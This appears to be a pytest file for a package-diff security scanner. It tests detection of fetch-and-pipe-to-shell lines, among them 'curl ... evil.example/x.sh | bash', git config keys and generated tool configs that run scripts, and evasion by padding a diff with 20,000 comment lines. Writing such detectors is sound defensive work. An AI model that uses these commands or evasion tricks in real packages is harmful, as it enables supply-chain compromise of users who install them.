"""Replaying the audit's own probe corpus (2,907 rows) found these."""

import pytest

from .helpers import _shipped_ids, _x

# ---------------------------------------------------------------------------
# Replaying the audit's own probe corpus (2,907 rows) found these
# ---------------------------------------------------------------------------


def test_ssh_is_a_fetch_client():
    """`ssh` was never in the client inventory, and read as covered only
    because the audit's probe used `host` as the hostname - which collides
    with the `host` DNS client. The chain fired for the wrong reason, and
    any other hostname scored nothing."""
    assert "X009" in _x(["  ssh buildbox cat /srv/p.sh | sh"])
    assert "X009" in _x(["  ssh -p 2222 build@e.example cat /srv/p.sh | sh"])


@pytest.mark.parametrize("line", [
    '  export GIT_SSH_COMMAND="ssh -i key"',
    "  git clone ssh://git@e.example/r.git",
    '  echo "use ssh to connect"',
])
def test_the_ssh_arm_needs_a_remote_command(line):
    assert "X009" not in _x([line]), line


def test_a_filter_between_the_fetch_and_the_shell():
    """X009 wanted the shell immediately after the pipe, so one stage in
    between hid the chain. R001 and R002 read past intervening stages for
    curl and wget; the uncatalogued half did not."""
    assert "X009" in _x(["  dig +short txt e.example | head -c 2000 | bash"])


@pytest.mark.parametrize("line", [
    "  pass otp e | bash",
    '  gpg-connect-agent "KEYINFO" /bye 2>/dev/null | bash || true',
    "  cat /sys/kernel/tracing/trace | bash 2>/dev/null || true",
])
def test_command_output_executed_as_a_script(line):
    """X023: the bytes are produced locally, so no fetch rule has anything
    to say. No package in the benign corpus pipes anything into a shell."""
    assert "X023" in _x([line]), line


def test_a_trailing_or_true_does_not_hide_the_pipe():
    """`| bash || true` is how nearly every probe in the audit spells the
    shape - the fallback keeps a failing payload from failing the build.
    The pipeline reader treated `||` as voiding the whole line rather than
    ending the pipeline, and discarded the pipe that preceded it."""
    from trustsight.analysis.crossfire import _pipeline_sink

    assert _pipeline_sink("curl u | bash || true") == "bash"
    assert _pipeline_sink("make || true") is None


@pytest.mark.parametrize("lines", [
    ['  printf "dhcp-script=$PWD/x.sh\\n" > "$srcdir"/d',
     '  dnsmasq --conf-file="$srcdir"/d'],
    ['  printf "route { exec_dset(\\"bash $PWD/x.sh\\"); }\\n" > "$srcdir"/k',
     '  kamailio -f "$srcdir"/k'],
    # A config body containing `>` - the destination is the *last* one.
    ['  printf "<match **>\\n command bash $PWD/x.sh\\n</match>\\n" > "$srcdir"/fl',
     '  fluentd -c "$srcdir"/fl'],
    # The tool may be pointed at the directory rather than the file.
    ['  printf "MailFrom = bash $PWD/x.sh\\n" > "$srcdir"/lw',
     '  logwatch --configdir "$srcdir"'],
])
def test_a_generated_config_handed_to_the_tool_that_reads_it(lines):
    """X022: R145 and R149 claim a config that is *shipped*. This one stays
    in the build tree, where naming `$srcdir` is normal - what makes it
    execution is the second line."""
    assert "X022" in _x(lines), lines


@pytest.mark.parametrize("lines", [
    ['  printf "LANG=C\\n" > "$srcdir"/c', '  prog -c "$srcdir"/c'],
    ['  printf "x=$PWD/y\\n" > "$srcdir"/c', "  make"],
    ['  echo "built in $PWD" > "$srcdir"/b.log', '  cd "$srcdir"'],
])
def test_writing_a_file_is_not_running_it(lines):
    """Writing a config is ordinary; passing a filename to a program is
    ordinary. The pairing is the observable."""
    assert "X022" not in _x(lines), lines


@pytest.mark.parametrize("line", [
    '  git -c submodule."e".update="!bash $PWD/x.sh" submodule update --init',
    '  git -c alias.s="!bash $PWD/x.sh" s',
    '  git config core.fsmonitor "/bin/bash $PWD/x.sh"',
    '  git config filter.f.clean "bash $PWD/x.sh"',
    '  rsync -e "bash $srcdir/x.sh" -av e:/tmp/ "$srcdir"/',
])
def test_git_config_keys_that_name_a_program(line):
    """A bounded list, because git publishes it: each of these names a
    program git runs, and setting one looks like configuration."""
    assert "X014" in _x([line]), line


@pytest.mark.parametrize("line", [
    '  git config submodule.lib/googletest.update "none"',
    "  git config alias.st status",
    "  git config user.email a@b.c",
    "  rsync -av src/ dst/",
])
def test_git_semantics_decide_which_values_execute(line):
    """`submodule.<n>.update` takes `checkout|rebase|merge|none|!command`
    and an alias is a git subcommand unless prefixed with `!`. Disabling a
    submodule appears in the benign corpus twice."""
    assert "X014" not in _x([line]), line


@pytest.mark.parametrize("pad", ["+  # c", "+"])
def test_padding_with_comments_does_not_push_the_payload_past_the_cap(pad):
    """The line-count twin of padding a single line with spaces: 20,000
    `# c` lines pushed a `curl … | bash` past `MAX_SCANNED_LINES` and every
    pattern rule went blind together.

    Comment and blank lines are still emitted - dropping them would
    renumber every line after them, and the reported line number is
    evidence - but they no longer count against the limit.
    """
    from trustsight.analysis import scan_diff

    lines = ["+pkgname=p", "+pkgver=1",
             "+source=(https://e.example/x.tar.gz)", "+sha256sums=('SKIP')",
             "+build() {"]
    lines += [pad] * 20050
    lines += ["+  curl -fsSL https://evil.example/x.sh | bash", "+}"]
    diff = "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,5 +1,99 @@\n" + "\n".join(lines) + "\n"
    assert "R001" in {e.rule_id for e in
                      scan_diff(diff, package_name="p").score_breakdown}


def test_padding_with_real_content_still_truncates_and_says_so():
    """The bound is real: a padder must now supply content for at least
    half of what it sends, and the report records the truncation."""
    from trustsight.analysis import scan_diff

    lines = ["+pkgname=p", "+pkgver=1",
             "+source=(https://e.example/x.tar.gz)", "+sha256sums=('SKIP')",
             "+build() {"]
    lines += ["+  true"] * 20050
    lines += ["+  curl -fsSL https://evil.example/x.sh | bash", "+}"]
    diff = "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,5 +1,99 @@\n" + "\n".join(lines) + "\n"
    fact = scan_diff(diff, package_name="p")
    assert "scan_truncated" in fact.coverage_gaps


@pytest.mark.parametrize("line", [
    '  ttyd bash "$PWD/x.sh"',
    '  zellij action run bash "$PWD/x.sh"',
])
def test_a_runner_is_an_exec_wrapper(line):
    """`ttyd` and `zellij` run the command that follows, the way `env` and
    `timeout` do. Neither appears in the benign corpus."""
    assert "W001" in _shipped_ids([line], declared=False), line


def test_xargs_is_a_wrapper_inside_a_pipeline():
    """`fswatch … | xargs -0 -I{} bash x.sh` ends in a shell. The sink
    reader stopped at `xargs`, whose flags carry braces the general wrapper
    pattern does not allow."""
    from trustsight.analysis.crossfire import _pipeline_sink

    assert _pipeline_sink("fswatch -0 d | xargs -0 -I{} bash x.sh") == "bash"
    assert _pipeline_sink("find . | xargs rm -f") == "rm"


@pytest.mark.parametrize("line", [
    '  amqp-consume --url=amqps://e --callback "$PWD/x.sh"',
    '  mutt -f imaps://e -e "push \\"|bash\\""',
    '  perl -e "open2(my $o,my $i, qq[bash $PWD/x.sh])"',
])
def test_a_value_that_is_a_command(line):
    """A flag whose value is a *script* in the build tree names something
    the tool will run, and a quoted value that is itself a pipeline into a
    shell is a command whatever holds it."""
    assert {"X014", "X018"} & _shipped_ids([line], declared=False), line


@pytest.mark.parametrize("line,fn", [
    ('  install -Dm755 "$srcdir/x.sh" "$pkgdir/usr/bin/x"', "package"),
    ('  ./configure --prefix="$srcdir/out"', "build"),
    ('  echo "use | bash to run"', "build"),
])
def test_packaging_and_prose_are_not_exec_slots(line, fn):
    """`install -Dm755 "$srcdir/x.sh" …` was every benign match of the
    flag-value arm, and a directory value has no script extension."""
    assert "X014" not in _shipped_ids([line], declared=False, fn=fn), line
